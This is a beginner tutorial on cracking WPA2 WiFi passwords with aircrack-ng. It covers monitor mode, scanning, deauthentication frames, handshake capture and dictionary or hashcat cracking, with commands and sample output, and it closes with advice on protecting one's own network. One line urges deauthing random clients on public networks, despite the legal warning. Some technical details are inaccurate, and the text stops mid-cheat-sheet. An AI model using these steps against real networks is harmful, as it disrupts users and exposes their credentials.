# Aircrack-ng WiFi Security Tutorial — Absolute Beginner's Guide

> **⚠️ LEGAL WARNING**
> This tutorial is for **educational purposes only**. Use only on networks you **own** or have **explicit written permission** to test. Unauthorized access to computer networks is illegal in most jurisdictions (e.g., US Computer Fraud and Abuse Act, UK Computer Misuse Act, EU cybercrime laws). The author is not responsible for any misuse.

---

## How to Read This Tutorial

- **Terminal commands** are in code blocks like this:
  ```bash
  sudo airmon-ng
  ```
- **Expected output** follows the command (indented), so you know what to see
- **Explanations** come after each block — don't skip them
- **⚠️ Beginner notes** (callout boxes) explain concepts you may not know yet
- **Bold** text highlights things you must remember or type carefully

---

## Table of Contents

1. [Before We Start: What You Need to Know](#before-we-start)
2. [What is WiFi? (The Very Basics)](#what-is-wifi)
3. [What is Aircrack-ng?](#what-is-aircrack-ng)
4. [Glossary of Key Terms](#glossary)
5. [Prerequisites & Installation](#prerequisites--installation)
6. [WiFi Adapter: What You Need and How to Check](#wifi-adapter)
7. [The Big Picture: How the Attack Works](#the-big-picture)
8. [Step-by-Step Walkthrough](#step-by-step-walkthrough)
   - [Step 1: Put Your Adapter in Monitor Mode](#step-1-monitor-mode)
   - [Step 2: Scan for Networks](#step-2-scanning)
   - [Step 3: Target a Specific Network](#step-3-target)
   - [Step 4: Start Capturing Packets](#step-4-capture)
   - [Step 5: Deauthenticate a Client](#step-5-deauth)
   - [Step 6: Verify the Handshake](#step-6-handshake)
   - [Step 7: Crack the Password](#step-7-crack)
9. [Troubleshooting: What Went Wrong?](#troubleshooting)
10. [What If It Doesn't Work? (Common Beginner Mistakes)](#beginner-mistakes)
11. [Understanding What You're Actually Cracking](#the-math)
12. [How to Protect Your Own WiFi](#defensive)
13. [Quick Reference: All Commands at a Glance](#cheat-sheet)
14. [Next Steps to Learn More](#next-steps)

---

## <a name="before-we-start"></a>Before We Start: What You Need to Have

Before running **any** command in this tutorial, check these off:

- [ ] A computer running Linux (Kali Linux recommended, but Ubuntu/Arch/Fedora work too)
- [ ] A wireless adapter that supports **monitor mode** and **packet injection** (see the [WiFi Adapter](#wifi-adapter) section below)
- [ ] A target network **you own or have permission to test**
- [ ] A connected client device (phone, laptop, IoT device) on the target network — you need this to capture the handshake
- [ ] Patience — things don't always work on the first try

**If you're on Windows or macOS:** Use a Linux live USB (e.g., Kali Linux live boot) or a virtual machine with USB passthrough for the adapter. The tools in this tutorial are Linux-native and will not work on Windows/macOS natively.

---

## <a name="what-is-wifi"></a>What is WiFi? (The Very Basics)

### What is a WiFi network?
A WiFi network is a radio connection between devices. Your router broadcasts a radio signal. Your phone, laptop, or smart TV picks up that signal and connects. Think of it like a walkie-talkie — everyone can hear the radio, but only the right device is supposed to respond.

### How do WiFi networks stay "private"?
When you connect to WiFi at home, you set a **password**. This password encrypts the data so others can't snoop on what you're doing. The technical name for this password-based encryption is **WPA2-Personal** (or WPA3-Personal for newer devices).

The password is also called a **Pre-Shared Key (PSK)** — the same secret key is shared between every device connecting to the network.

### What's a BSSID?
A **BSSID** (Basic Service Set Identifier) is the **MAC address** of your WiFi router. MAC addresses look like this: `AA:BB:CC:DD:EE:FF` — six pairs of letters and numbers separated by colons. Every network device has a unique MAC address. The router's MAC address is the BSSID.

### What's an ESSID?
An **ESSID** (Extended Service Set Identifier) is the **name** of the WiFi network — the name that shows up when you look at available WiFi on your phone. For example, "TP-Link_3F2A" or "MyHomeNetwork".

### What's a client?
A **client** is any device connected to the WiFi network — your phone, laptop, smart TV, IoT gadget, etc. Each client has its own MAC address called a **Station (STA)** address.

---

## <a name="what-is-aircrack-ng"></a>What is Aircrack-ng?

**Aircrack-ng** is a collection of open-source tools for testing WiFi security. It does not "hack into" a network the way a movie might show. Instead, it:

1. **Listens** to the radio traffic around the WiFi network (passively)
2. **Captures** a special handshake that happens when a device connects to the network
3. **Tries millions of passwords** offline against that handshake to see if any of them match

It's like a locksmith who records a lock's mechanism and then tries thousands of keys at their workbench — they don't need to be at the door to test each key.

### The tools you'll use

| Tool | What it does | Analogy |
|------|-------------|---------|
| `airmon-ng` | Puts your WiFi card into "spy mode" | Switching a receiver to scan all frequencies |
| `airodump-ng` | Listens and records all nearby WiFi networks | Tuning a radio to list all stations |
| `aireplay-ng` | Sends fake "disconnect" signals to force reconnections | Ringing the doorbell to make someone come out |
| `aircrack-ng` | Tests passwords against the captured handshake | Trying keys against the recorded lock |

---

## <a name="glossary"></a>Glossary of Key Terms

As you read, here's what the jargon means:

| Term | Meaning |
|------|---------|
| **Monitor Mode** | A special operating mode for WiFi adapters that lets you see ALL radio traffic, not just traffic addressed to your device |
| **Packet** | A small chunk of data sent over the network (like a letter in the mail) |
| **Handshake** | The conversation between a client and router when connecting — a 4-step exchange that proves both sides know the password |
| **EAPOL** | "Extensible Authentication Protocol over LAN" — the technical format of the handshake messages |
| **Deauthentication (deauth)** | A frame that tells a client to disconnect from the network |
| **Dictionary attack** | Trying a list of common passwords one after another |
| **Brute force** | Trying every possible combination of characters |
| **PMK (Pairwise Master Key)** | Derived from the password + network name; used to derive session keys |
| **PTK (Pairwise Transient Key)** | The session-specific encryption key for one client |
| **MIC (Message Integrity Check)** | A checksum that proves a message hasn't been tampered with — used to verify a password guess |
| **WPA2/WPA3** | WiFi Protected Access versions 2 and 3 — the encryption standards |
| **PSK** | Pre-Shared Key — the password for a home/small office WiFi |
| **CCMP** | The encryption cipher used in WPA2 (Counter Mode with CBC-MAC Protocol) |
| **Beacon frame** | A broadcast message the router sends every few seconds announcing "I'm here, my name is X" |
| **BSSID** | MAC address of the access point (router) |
| **ESSID** | The human-readable name of the WiFi network |
| **Channel** | The specific radio frequency the router uses (like channels on a TV tuner) |
| **dBm** | Signal strength measurement — higher (less negative) = stronger signal |
| **Interface** | A software representation of a hardware device (e.g., `wlan0` is your WiFi card) |
| **Injection** | Sending custom-crafted packets (not just regular traffic) |

---

## <a name="prerequisites"></a>Prerequisites & Installation

### Which Linux distribution?

**Kali Linux** is the standard for WiFi security testing — it comes with everything pre-installed. We recommend it for beginners. You can:

1. **Install Kali Linux** on a separate partition or USB drive
2. **Boot Kali Live USB** (no installation needed)
3. **Use Kali in a Virtual Machine** (VirtualBox/VMware) — but passing through the USB WiFi adapter can be tricky for beginners; bare metal or USB drive is better

If you're using another distro, that's fine too — just install the tools manually (see below).

### Step-by-step installation

#### On Kali Linux
Aircrack-ng is already installed. Verify:
```bash
aircrack-ng --version
```
Expected output (version may differ):
```
1.7  - (C) 2006-2022 Thomas d'Otreppe
  https://www.aircrack-ng.org
```
If you see a version number, you're good. If you get "command not found," install:
```bash
sudo apt update
sudo apt install aircrack-ng
```

#### On Ubuntu / Debian
```bash
sudo apt update
sudo apt install aircrack-ng
```

#### On Arch Linux
```bash
sudo pacman -S aircrack-ng
```

#### On Fedora
```bash
sudo dnf install aircrack-ng
```

### What else should you install?

For a good wordlist and extra tools:

```bash
# On Kali: wordlists are already there, but make sure SecLists is present
sudo apt install wordlists seclists

# On Ubuntu/Debian, download SecLists manually:
sudo apt install git
git clone https://github.com/danielmiessler/SecLists.git ~/SecLists
```

**Optional but recommended:** `hcxdumptool` and `hashcat` (for more advanced attacks):
```bash
sudo apt install hcxdumptool hcxtools hashcat
```

---

## <a name="wifi-adapter"></a>WiFi Adapter: What You Need and How to Check

### ⚠️ This is the #1 reason beginners fail

Your WiFi adapter must support two things: **monitor mode** and **packet injection**. Most cheap laptop WiFi chips do NOT support these. You often need a **USB WiFi adapter**.

### USB WiFi adapters that work (beginner-friendly picks)

| Adapter | Chipset | Price | Why it works |
|---------|---------|-------|--------------|
| **Alfa AWUS036ACH** | RTL8812AU | ~$15-25 | Most popular for aircrack, reliable |
| **Alfa AWUS036ACHM** | RTL8812AU | ~$20-30 | Same chipset, better antenna |
| **TP-Link TL-WN722N v1 only** | Atheros AR9271 | ~$8 | Cheap and works, but **only v1** |
| **TP-Link TL-WN823N v3** | RTL8812AU | ~$10 | Budget option |

⚠️ **Important:** If you already bought an adapter, check which chipset it has by running:
```bash
lsusb
```
Look for the name in the output, then check the "Chipsets" list online.

### Check if your adapter supports monitor mode

Connect your WiFi adapter (USB or internal), then run:
```bash
sudo airmon-ng
```

If your adapter is listed and shows an interface name (like `wlan0` or `wlp2s0`), you're good. If nothing shows up, the adapter isn't connected or the driver isn't loaded.

### What is an interface name?
When Linux detects a network device, it gives it a name like `wlan0` (wireless LAN 0) or `wlp2s0` (wireless PCI slot 2, function 0). You'll need this name for the commands below. Find it with:
```bash
iw dev
```
or:
```bash
ip link show
```
You're looking for a line that says "wlan" or "wl" followed by a number — that's your WiFi interface.

### Check packet injection support
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0   # Replace "wlan0" with YOUR interface name
iwconfig wlan0mon            # Replace "wlan0mon" — should see "Mode:Monitor"
```
Look for two things in the output:
1. **`Mode:Monitor`** — monitor mode is active
2. **`Bit Rate:___Mb/s`** — a connected rate (not "N/A") means the adapter is functional

If monitor mode fails, your card's driver doesn't support it. You'll need a different adapter.

---

## <a name="the-big-picture"></a>The Big Picture: How the Attack Works

Here's the complete process, explained simply:

```
Step 1: Your WiFi adapter goes into "spy mode" (monitor mode)
         → It now listens to ALL WiFi traffic, not just traffic for your device

Step 2: You scan for nearby networks and pick your target
         → You note the target's BSSID (MAC address) and channel

Step 3: You start recording packets from the target network
         → This creates a .cap file on your hard drive

Step 4: You disconnect a connected client from the network (deauth attack)
         → The client reconnects, and during reconnection, a 4-way handshake is exchanged
         → The handshake is automatically captured into your .cap file

Step 5: You use a password list (dictionary) to guess the password
         → Aircrack tries each password against the handshake offline
         → If you guessed right, it shows the password!
```

**Key insight:** The attack is entirely off the network itself. Once you have the handshake, your computer does all the password guessing locally — no connection to the target WiFi needed.

---

## <a name="step-by-step"></a>Step-by-Step Walkthrough

This is the core of the tutorial. Follow each step in order.

---

### <a name="step-1"></a>Step 1: Put Your WiFi Adapter in Monitor Mode

**Why:** Normal mode only sees traffic meant for your device. Monitor mode lets you see everyone's traffic on that channel — like overhearing an entire conversation instead of just the messages addressed to you.

**Before you begin:** Note your WiFi interface name (from the [Adapter](#wifi-adapter) section). Common names: `wlan0`, `wlp2s0`, `wlp3s0`. If you're not sure, check with `iw dev` or `ip link show`.

Run these commands:

```bash
# 1. First, kill any programs that might interfere with monitor mode
sudo airmon-ng check kill
```
Expected output:
```
Killing processes that might interfere...
  1234 ?        00:00:00 NetworkManager
  5678 ?        00:00:00 wpa_supplicant
  ...
```
Don't worry if the process IDs (PIDs) are different — the important thing is it tells you it's killing things.

```bash
# 2. Start monitor mode on your WiFi interface
#    Replace "wlan0" with YOUR interface name from earlier
sudo airmon-ng start wlan0
```
Expected output:
```
PHY     Interface       Driver          Chipset
phy0    wlan0           mac80211        ...

        (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
        (mac80211 station mode vif disabled for [phy0]wlan0)
```
A new interface called `wlan0mon` (or similar — it appends "mon" to your interface name) has been created. This is your "spy mode" interface.

```bash
# 3. Verify it's in monitor mode
iwconfig
```
Expected output (look for `wlan0mon` or similar):
```
wlan0mon  IEEE 802.11  ESSID:off/any
          Mode:Monitor  Frequency:2.412 GHz  (Channel 1)
          Tx-Power=20 dBm
          ...
```
✅ You see **`Mode:Monitor`** — you're in spy mode!

**When you're done (to go back to normal):**
```bash
sudo airmon-ng stop wlan0mon
```

---

### <a name="step-2"></a>Step 2: Scan for Nearby Networks

**Why:** Before you can attack a specific network, you need to know what's around you — its name (ESSID), its BSSID (MAC address), and what channel it's on.

Run the scan:
```bash
sudo airodump-ng wlan0mon
```

This will show a live-updating list of all nearby WiFi networks. **Let it run for 10-30 seconds** to stabilize. You'll see output like this:

```
CH  6 ][ Elapsed: 23s ][ 2026-07-28 14:32 ][ WPA handshake: AA:BB:CC:DD:EE:FF

                                                        CH  6
BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
AA:BB:CC:DD:EE:FF  -45       85        0    0   6   54   WPA2 PSK   CCMP   MyHomeNetwork
11:22:33:44:55:66  -70       12        5    1   1   54   WPA2 PSK   CCMP   NeighborWiFi
```

Let's understand each column:

- **BSSID** — The router's MAC address (your target identifier)
- **PWR** — Signal strength (measured in dBm). Less negative = stronger. -30 is excellent, -70 is okay, -90 is very weak
- **Beacons** — How many "I'm here!" messages the router has sent
- **#Data** — How many data packets have been seen (more is better for capture)
- **CH** — The WiFi channel (1-14 for 2.4GHz; higher numbers for 5GHz)
- **ENC** — Encryption type (WPA2 or WPA3 means password-protected)
- **CIPHER** — Encryption cipher (CCMP = good, TKIP = older)
- **AUTH** — Authentication method (PSK = Pre-Shared Key = the typical home WiFi)
- **ESSID** — The network name

⚠️ **Note the BSSID** of the target network — you'll need it for later steps. Let's say it's `AA:BB:CC:DD:EE:FF` and the network name is "MyHomeNetwork" on channel 6.

Also look at the bottom section listing **STATION** (connected clients):
```
STATION            PWR  Rate    Lost    Frames  BSSID              PROBE
FF:EE:DD:CC:BB:AA  -88   0       0       50      AA:BB:CC:DD:EE:FF  MyHomeNetwork
```
Each STATION is a device connected to that AP. You'll need at least **one** connected client.

**If there are no clients connected:** You can skip the deauth step and wait — eventually someone will connect and you'll capture the handshake passively. But that's slow and unreliable. The deauth method (next steps) forces a handshake.

👉 **Leave this terminal running** in the background for Steps 3 and 4.

---

### <a name="step-3"></a>Step 3: Focus on Your Target (Optional but Recommended)

This step narrows the scan to just one network. It makes the output cleaner and reduces file size. You can skip this if you want — just use the full output from Step 2.

Open a **new terminal** and run:

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

Breaking down every part of this command:

| Part | Meaning |
|------|---------|
| `sudo` | Run as administrator (required for raw wireless operations) |
| `airodump-ng` | The scanning/capture tool |
| `-c 6` | Only listen on channel 6 (the target's channel) |
| `--bssid AA:BB:CC:DD:EE:FF` | Only show the target network (filter by MAC address) |
| `-w capture` | Write captured packets to files starting with "capture" on disk |
| `wlan0mon` | The monitor mode interface we set up earlier |

You'll see a cleaner output now showing only your target network. **Leave this terminal running.**

**What's this `-w capture` doing?**
Every time a packet is captured, it's written to a file on your hard drive:
- `capture-01.cap` (or `capture.cap` if it's the first file)
- These files accumulate all the WiFi traffic
- You'll use them later to crack the password

---

### <a name="step-4"></a>Step 4: Capture the Handshake by Deauthenticating a Client

⚠️ **The deauth attack is the step that raises the most ethical and legal concerns.** It involves sending fake network management frames to disconnect a connected device. **Only perform this on networks you own or have explicit written authorization to test.**

**What is a deauthentication frame?** It's a management frame (part of the WiFi protocol) that tells a connected device to disconnect. Routers expect these frames from other routers, but in a deauth attack, we send one pretending to be the router.

**Why does this help?** When a client gets disconnected and reconnects, they have to redo the 4-way handshake. We capture that handshake for Step 7.

**You need two terminals running simultaneously:**
- **Terminal A** (from Step 3): `airodump-ng` capturing packets
- **Terminal B** (this step): `aireplay-ng` sending deauth frames

In a **new terminal** (Terminal B), run:

```bash
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

Breaking down the command:

| Part | Meaning |
|------|---------|
| `sudo` | Administrator privileges (needed for injection) |
| `aireplay-ng` | The packet injection tool |
| `--deauth 10` | Send 10 deauthentication frames |
| `-a AA:BB:CC:DD:EE:FF` | The target AP's BSSID (the router's MAC) |
| `wlan0mon` | Your monitor mode interface |

Expected output (Terminal B):
```
14:35:02  Sending DeAuth to station -- BSSID: [AA:BB:CC:DD:EE:FF] on channel 6
14:35:02  Sending DeAuth to station -- BSSID: [AA:BB:CC:DD:EE:FF] on channel 6
...
```

**What should happen:**
1. A connected client gets disconnected from the WiFi
2. The client tries to reconnect (entering a new password authentication)
3. During reconnection, the 4-way handshake is exchanged
4. **Terminal A (airodump-ng)** automatically captures the handshake

**In Terminal A**, watch for this line to appear:
```
WPA handshake: AA:BB:CC:DD:EE:FF
```

✅ When you see `WPA handshake`, you have everything you need. **You can now stop both terminals.**

To stop Terminal B: press `Ctrl+C` in the terminal running `aireplay-ng`.
To stop Terminal A: press `Ctrl+C` in the terminal running `airodump-ng`.

**What if the handshake doesn't show up?**
- The client might not be connected — check Terminal A for STATION entries
- The client might be too far away — get closer to the router
- Deauth frames might be filtered by the client — try again with a higher count: `--deauth 50` or `--deauth 100`
- Try deauthing a specific client (more on this below)

#### Targeting a specific client

If Terminal A shows a specific STATION connected to your target AP, you can target that device:

```bash
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c FF:EE:DD:CC:BB:AA wlan0mon
```

Additional argument:
- `-c FF:EE:DD:CC:BB:AA` — the **client's MAC address** (the STATION column from Terminal A)

This is more precise and less likely to disrupt other devices.

---

### <a name="step-6"></a>Step 6: Verify You Have a Valid Handshake

**Before you try to crack anything**, make sure the capture file contains a valid handshake. This saves you from wasting time.

```bash
aircrack-ng capture-01.cap
```

Expected output (success):
```
Opening capture-01.cap
Read 4620 packets.

         #  BSSID              ESSID

  1  AA:BB:CC:DD:EE:FF  MyHomeNetwork

Opening capture-01.cap
Read 4620 packets.

1 handshake successfully parsed
```
✅ The line **"1 handshake successfully parsed"** means your capture is good.

Expected output (no handshake found):
```
No handshake found
```
❌ If you see this, go back to [Step 4](#step-4) and try again.

---

### <a name="step-7"></a>Step 7: Crack the Password

Now for the actual password guessing. This step is **offline** — you don't need any connection to the target WiFi network anymore. You're just testing your computer's ability to guess passwords.

#### 7a: Get a wordlist

A wordlist is just a text file with one password per line. The most famous one is **rockyou.txt** — a real-world leak of 14 million passwords from a 2009 data breach (the rockyou.com breach). It's the standard benchmark in WiFi security.

**On Kali Linux:**
```bash
ls /usr/share/wordlists/rockyou.txt.gz
```
If you see the file, decompress it:
```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

**On Ubuntu/Debian/Arch/Fedora (not Kali):**
```bash
sudo apt install wordlists
# For Kali's rockyou specifically on non-Kali:
wget https://downloads.skullsecurity.org/passwords/rockyou.txt.bz2 -O rockyou.txt.bz2
bunzip2 rockyou.txt.bz2
```

**To test your wordlist is valid:**
```bash
wc -l /usr/share/wordlists/rockyou.txt
```
Expected: a number in the millions (14,344,391 is the full rockyou count)

#### 7b: Run the crack

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

Breaking it down:

| Part | Meaning |
|------|---------|
| `-w /usr/share/wordlists/rockyou.txt` | Path to the wordlist (password list) |
| `-b AA:BB:CC:DD:EE:FF` | Only test against this specific BSSID (important if multiple APs in capture) |
| `capture-01.cap` | The capture file containing the handshake |

**What happens while it runs:**
```
Opening capture-01.cap
Read 4620 packets.

         #  BSSID              ESSID

  1  AA:BB:CC:DD:EE:FF  MyHomeNetwork

Reading packets, please wait...
Opening capture-01.cap
Read 4620 packets.

1 handshake successfully parsed

          Aircrack-ng 1.7

      [00:00:00] 2 keys tested (12345.67 k/s)
```

The line `2 keys tested (12345.67 k/s)` tells you:
- It's already tried 2 passwords
- It's testing about 12,345 passwords per second

If the password is in the wordlist:
```
      KEY FOUND! [ Summer2025! ]

      Master Key     : 1A 2B 3C 4D 5E 6F 7A 8B ... (full hex key)
      Transient Key  : ...
      EAPOL HMAC     : ...
```
✅ **KEY FOUND!** The password is `Summer2025!` (or whatever matched).

If the password is NOT in the wordlist:
```
      0 keys tested (X k/s)

      KEY NOT FOUND
```
❌ The password isn't in your wordlist. You'd need a different wordlist or a more advanced attack.

#### 7c: Using a custom/curated wordlist

If you know anything about the target (the owner's name, the house number, their dog's name, etc.), create a custom wordlist:

```bash
echo -e "password\nadmin\nSummer2025\nSmith2026\nwelcome1\nSparky" > custom.txt
aircrack-ng -w custom.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

The `echo -e` command creates a file with each `\n` starting a new line.

#### 7d: Brute force with aircrack-ng (incremental mode)

If you don't have a wordlist, aircrack-ng has a built-in brute force that tries every possible combination of letters, numbers, and symbols:

```bash
aircrack-ng -w - -b AA:BB:CC:DD:EE:FF capture-01.cap
```
The single dash `-` means "use the built-in incremental brute force engine."

⚠️ **Warning:** This is **extremely slow**. It's only practical for very short passwords (under 6-7 characters). For anything longer, use a dictionary or switch to hashcat + GPU cracking.

#### 7e: Advanced — using hashcat (GPU-accelerated)

If you have a decent NVIDIA/AMD graphics card, hashcat can test **billions** of passwords per second (vs. thousands for aircrack-ng on CPU).

```bash
# Convert the .cap file to hashcat's format
hcxpcapngtool capture-01.cap -o capture.hc22000

# Run hashcat (mode 22000 = WPA-PBKDF2-PMKID+EAPOL)
hashcat -m 22000 capture.hc22000 -a 0 /usr/share/wordlists/rockyou.txt
```

This is significantly faster than aircrack-ng for large wordlists, but requires:
- A dedicated GPU (not just an integrated GPU)
- The `hashcat` and `hcxtools` packages installed
- Some understanding of hashcat modes and rules

For beginners, start with aircrack-ng (which uses your CPU). It's perfectly adequate for learning and for testing password strength.

---

## <a name="troubleshooting"></a>Troubleshooting: What Went Wrong?

### Problem: "Interface doesn't support monitor mode"
**Cause:** Your adapter's driver doesn't support monitor mode.
**Fix:** Your adapter chip doesn't support it. Get a different USB adapter (see the list in the [WiFi Adapter](#wifi-adapter) section). Internal WiFi chips (`iwlwifi`, etc.) on many laptops have monitor mode disabled by the manufacturer.

### Problem: "Error for wireless request: Operation not supported"
**Cause:** Packet injection isn't supported.
**Fix:** Same as above — you need a different adapter. Check `airmon-ng` to see if your adapter shows the injection capability.

### Problem: `airodump-ng` shows 0 beacons or 0 APs
**Cause:** Wrong interface, or no WiFi networks in range.
**Fix:**
1. Verify your interface is in monitor mode: `iwconfig wlan0mon` → look for `Mode:Monitor`
2. Make sure you're using the right interface name (not `wlan0`, but `wlan0mon`)
3. Check your adapter has a good signal to nearby networks
4. Try changing channel: `airodump-ng --band ab wlan0mon` (includes 5GHz if your adapter supports it)

### Problem: "No handshake found" after running deauth
**Cause:** The deauth didn't trigger a reconnection, or the handshake wasn't captured.
**Fixes (try these in order):**
1. **Get closer** to the target router — you need a strong signal for reliable capture
2. **Increase deauth count** — use `--deauth 50` or `--deauth 100`
3. **Check that a client is connected** — look at `airodump-ng` output for STATION entries
4. **Try deauthing a specific client** instead of all clients (see [Targeting a specific client](#targeting-a-specific-client))
5. **Wait** — sometimes the handshake is already in the air. Look for `WPA handshake` in the `airodump-ng` output before you even send deauths
6. **Check for PMF** — if the AP requires Protected Management Frames, deauth attacks won't work. Modern routers (WPA3) use this.

### Problem: Cracking runs but "KEY NOT FOUND"
**Cause:** The password is not in your wordlist.
**Fixes:**
1. Try a bigger wordlist (e.g., `rockyou.txt` instead of a small custom list)
2. The password might have numbers/symbols your wordlist doesn't cover — try adding common variants
3. The password might be a real word in another language — use a multilingual wordlist
4. If you have any idea about the password pattern, build a custom wordlist with those clues

### Problem: `airmon-ng start wlan0` says "monitor mode not supported" after booting into a different OS
**Cause:** Some chipsets (especially Realtek, Ralink) have proprietary drivers that don't fully support monitor mode on Linux.
**Fix:**
```bash
sudo modprobe -r rt2800usb      # Remove the driver
sudo modprobe rt2800usb          # Re-load it (sometimes fixes injection)
# For Realtek RTL8812AU adapters:
sudo modprobe -r 8812au
sudo insmod /path/to/fix/8812au.ko
```
Or simply use a different adapter that's known to work.

---

## <a name="beginner-mistakes"></a>What If It Doesn't Work? (Common Beginner Mistakes)

### ❌ Mistake 1: Using your laptop's internal WiFi card
Most modern laptop WiFi chips (Intel AX210, etc.) work for scanning but **don't support packet injection** on Linux without extra effort. You'll get "operation not supported" errors.

**Fix:** Use a known-compatible USB adapter (Alfa AWUS036ACH is the most recommended).

### ❌ Mistake 2: Forgetting to switch to monitor mode
Running `airodump-ng wlan0` (the normal mode interface) instead of `airodump-ng wlan0mon` means you won't see other networks' traffic — you'll only see traffic for your own network.

**Fix:** Always verify you're on `wlan0mon` for all the `airodump-ng` and `aireplay-ng` commands.

### ❌ Mistake 3: Not having a connected client
If nobody is connected to the target network, the deauth attack has nothing to disconnect. And without a disconnected-then-reconnected client, there's no new handshake to capture.

**Fix:** You need at least one client connected. For your own network, connect a phone or laptop, then deauth the phone. If it's a public network, just wait for random clients to connect and deauth them — they'll reconnect.

### ❌ Mistake 4: Not being close enough to the target
WiFi signals degrade with distance. If your adapter can't sniff the target's packets reliably, the handshake capture will drop packets and be invalid.

**Fix:** Get within 10-20 meters of the target AP. Stronger signal (-50 to -60 dBm) = reliable capture.

### ❌ Mistake 5: Cracking on a weak wordlist
Using a tiny 10-word wordlist and expecting a home WiFi password to crack is unrealistic. WPA2 passwords are designed to be strong enough that a small wordlist won't find them.

**Fix:** Always start with `rockyou.txt` (14M passwords). If that fails, the password is either not in that list or is very strong.

### ❌ Mistake 6: Using the wrong channel
If you don't specify `-c 6` (or whatever channel the target is on), `airodump-ng` will scan ALL channels and hop between them. This can cause you to miss packets or split the capture across files.

**Fix:** Always set `-c [CHANNEL]` to match the target AP's channel for focused, reliable capture.

### ❌ Mistake 7: Forgetting `sudo`
Nearly all aircrack-ng commands require root privileges. Running them as a regular user gives "permission denied" or "Operation not permitted" errors.

**Fix:** Always use `sudo`. Better yet, make sure you're either logged in as root or have sudo configured.

### ❌ Mistake 8: Stopping `airodump-ng` too early
Some beginners send the deauth, see the handshake line, and immediately kill everything. If you kill `airodump-ng` while it's still writing the capture file, the .cap file might be incomplete or corrupted.

**Fix:** After you see `WPA handshake`, wait 5-10 seconds, then kill the terminals. The file should be fully written by then.

### ❌ Mistake 9: Expecting instant results
Cracking takes time. With `rockyou.txt` (14M passwords) on a modern CPU, expect maybe 2,000-10,000 passwords per second. That means testing the full wordlist could take 20-70 minutes (or even hours).

**Fix:** If the first few thousand passwords didn't match within 1 minute, the password is probably a less common one. Let it run. You can also try a smarter curated wordlist first (based on info about the target) before running rockyou.

---

## <a name="the-math"></a>Understanding What You're Actually Cracking

This section is for those who want to understand the technical details — but you can skip it if you just want to get results.

### The 4-way handshake explained

When a device joins a WPA2 WiFi network, it performs a 4-step conversation with the router. Each step sends a piece of information:

| Step | From | To | Sent |
|------|------|----|-----|
| 1 | AP | Client | ANonce (a random number from the router) |
| 2 | Client | AP | SNonce (a random number from the client) + MIC (a fingerprint of the password attempt) |
| 3 | AP | Client | GTK (the group encryption key) + MIC |
| 4 | Client | AP | Acknowledgment |

The **MIC** in step 2 is the critical part. It's a hash of the password attempt, and if your guessed password produces the same MIC that was in the original step 2 message, you've guessed the password correctly.

### How the cracking works
When you run `aircrack-ng`, it:
1. Reads the captured handshake from the `.cap` file
2. Extracts the ANonce, SNonce, and MIC from step 2
3. Also knows the AP's BSSID (which is mixed into the PMK derivation)
4. Also knows the network name (ESSID)
5. For each password in your wordlist, it does:
   ```
   PMK = PBKDF2(password, ESSID, 4096, 256)
   PTK = PBKDF2(PMK, ANonce, SNonce, AP_BSSID, Client_MAC, ...)
   MIC = HMAC-SHA1(PTK, EAPOL messages...)
   ```
6. Compares your guessed MIC to the real MIC from the handshake
7. If they match → **PASSWORD FOUND!**

### Why this is an offline attack
The cracking happens entirely on your computer, using the captured handshake data. You don't need to be near the target network at all. You can crack on a bus, in a café, or at home.

### Why password strength matters
- **8 lowercase letters** (a-z): ~200 billion combinations → crackable in hours on a decent GPU
- **10 mixed characters** (a-zA-Z0-9 + symbols): ~3 quadrillion combinations → thousands of years
- **Passphrase** (6+ random words): astronomical key space AND more memorable for users

The math is why "password123" falls in seconds and "correct-horse-battery-staple" would take millennia.

---

## <a name="defensive"></a>How to Protect Your Own WiFi (After Understanding the Attack)

If you've tested your own network and want to make it harder for attackers:

### 1. Use a strong password
- 16+ characters minimum
- Mix uppercase, lowercase, numbers, and symbols
- Or use a passphrase of 4-6 random words ("correct-horse-battery-staple")

### 2. Use WPA3 if your devices support it
WPA3-SAE (Simultaneous Authentication of Equals) replaces the PSK exchange and is resistant to offline dictionary attacks — an attacker cannot capture a handshake and guess passwords offline.

### 3. Enable PMF (Protected Management Frames)
PMF prevents deauthentication attacks entirely by authenticating management frames (including deauth). In your router settings:
- Set "Protected Management Frames" to **Required** (not "Optional" or "Disabled")

### 4. Disable WPS (WiFi Protected Setup)
WPS uses an 8-digit PIN that can be brute-forced in hours regardless of your WiFi password. Disable it in your router settings.

### 5. Use WPA2-AES only (not TKIP)
TKIP is an older cipher with known weaknesses. Make sure your router uses **AES/CCMP** only.

### 6. Hide your SSID (optional, marginal help)
Hiding your network name means it doesn't broadcast in beacon frames. However, it's still detectable in probe requests/responses from connected clients — it's not real security, just a minor speed bump.

### 7. Consider WPA-Enterprise for serious deployments
Instead of a shared password, each user gets individual credentials. Even if an attacker captures a handshake for one user, they only compromise that one account — not the whole network. This requires a RADIUS server and is common in corporate environments.

---

## <a name="cheat-sheet"></a>Quick Reference: All Commands at a Glance

```bash
# ===== CHECK YOUR ADAPTER =====
sudo airmon-ng                  # List interfaces
iw dev                          # List all interfaces
iwconfig                        # Show wireless details

# ===== MONITOR MODE =====
sudo airmon-ng check kill       # Kill interfering programs
sudo airmon-ng start wlan0      # Enable monitor mode (replace wlan0)
sudo airmon-ng stop wlan0mon    # Disable monitor mode
iwconfig wlan0mon              # Verify: look for "Mode:Monitor"

# ===== SCAN =====
sudo airodump-ng wlan0mon                          # Full scan, all channels
sudo airodump-ng -c 6 wlan0mon                     # Channel 6 only
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon  # Target one AP
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon  # Save to file

# ===== CAPTURE =====
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# → Creates capture-01.cap, capture-02.cap, etc.

# ===== DEAUTH =====
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon         # All clients
